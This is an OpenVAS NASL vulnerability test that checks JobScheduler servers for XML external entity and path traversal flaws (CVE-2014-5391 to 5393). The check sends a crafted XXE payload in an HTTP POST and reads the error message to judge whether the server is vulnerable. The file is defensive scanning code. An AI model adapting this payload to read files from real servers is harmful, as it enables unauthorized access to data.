###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_jobscheduler_mult_vuln_oct14.nasl 11974 2018-10-19 06:22:46Z cfischer $
#
# JobScheduler Multiple Vulnerabilities - Oct14
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804773");
  script_version("$Revision: 11974 $");
  script_cve_id("CVE-2014-5391", "CVE-2014-5392", "CVE-2014-5393");
  script_bugtraq_id(69660, 69664, 69661);
  script_tag(name:"cvss_base", value:"5.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:N/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-19 08:22:46 +0200 (Fri, 19 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-10-09 10:33:16 +0530 (Thu, 09 Oct 2014)");

  script_name("JobScheduler Multiple Vulnerabilities - Oct14");

  script_tag(name:"summary", value:"This host is installed with JobScheduler
  and is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP POST and
  check whether it is able to read arbitrary file or not.");

  script_tag(name:"insight", value:"Multiple flaws are due to,

  - An incorrectly configured XML parser accepting XML external entities from
    an untrusted source.

  - Improper validation of input before returning it to users, specifically
    path traversal style attacks (e.g. '../').");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attacker to gain access to arbitrary files, execute arbitrary HTML and
  script code or cause a denial of service.");

  script_tag(name:"affected", value:"JobScheduler version before 1.6.4246 and
  7.x before 1.7.4241.");

  script_tag(name:"solution", value:"Upgrade to version 1.6.4246 or 1.7.4241 or later.");

  script_xref(name:"URL", value:"http://www.sos-berlin.com/modules/news/article.php?storyid=73");
  script_xref(name:"URL", value:"http://www.sos-berlin.com/modules/news/article.php?storyid=74");
  script_xref(name:"URL", value:"http://www.christian-schneider.net/advisories/CVE-2014-5392.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 40444);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  script_xref(name:"URL", value:"http://www.sos-berlin.com/modules/cjaycontent/index.php?id=osource_scheduler_introduction_en.htm");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

http_port = get_http_port(default:40444);

host = http_host_name(port:http_port);

foreach dir (make_list_unique("/", "/jobscheduler", "/job-scheduler", "/scheduler", cgi_dirs(port:http_port)))
{

  if(dir == "/") dir = "";

  sndReq = http_get(item: string(dir, "/operations_gui/"),  port:http_port);
  rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

  if(">JobScheduler<" >< rcvRes)
  {
    entity =  rand_str(length:8,charset:"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ");

    url = dir + '/engine-cpp/';

    postData = '<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///' + entity +
               '" >]><commands><show_state subsystems="job folder" what="folders no_subfolders' +
               ' " path="/sos/update" max_task_history="0"/>&xxe;</commands>';

    sndReq = string("POST ", url, " HTTP/1.1\r\n",
                    "Host: ", host, "\r\n",
                    "X-Requested-With: XMLHttpRequest\r\n",
                    "Content-Length: ", strlen(postData), "\r\n",
                    "\r\n", postData);

    rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq, bodyonly:TRUE);

    if("The system cannot find the file specified" >< rcvRes &&
       "DOCTYPE is disallowed" >!< rcvRes)
    {
      security_message(port:http_port);
      exit(0);
    }
  }
}

exit(99);